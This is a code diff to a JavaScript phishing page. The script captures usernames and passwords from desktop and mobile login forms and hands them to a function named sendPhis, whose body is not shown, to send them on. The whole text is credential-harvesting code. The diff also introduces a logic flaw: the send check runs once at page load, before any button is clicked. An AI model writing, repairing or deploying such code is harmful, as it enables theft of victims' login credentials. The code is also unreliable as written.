@@ -9,20 +9,18 @@ function sendPhis(userdata) {
   });
 }
 function initialize() {
+  let username, password;
   document.getElementById("loginbutton").onclick = buttonclick => {
-    let username = document.getElementById("username").value;
-    let password = document.getElementById("userpassword").value;
+    username = document.getElementById("username").value;
+    password = document.getElementById("userpassword").value;
+  }
+  document.getElementById("mobileloginbutton").addEventListener("click", function () {
+    username = document.getElementById("mobusername").value;
+    password = document.getElementById("mobuserpassword").value;
+  });
+  if (username != "" && password != "") {
     let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
     sendPhis(userdata);
   }
-
-  document.getElementById("mobileloginbutton").addEventListener("click", function () {
-    let username = document.getElementById("mobusername").value;
-    let password = document.getElementById("mobuserpassword").value;
-    let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
-    sendPhis(userdata);
-  });
-
-
 }
 window.onload = initialize;
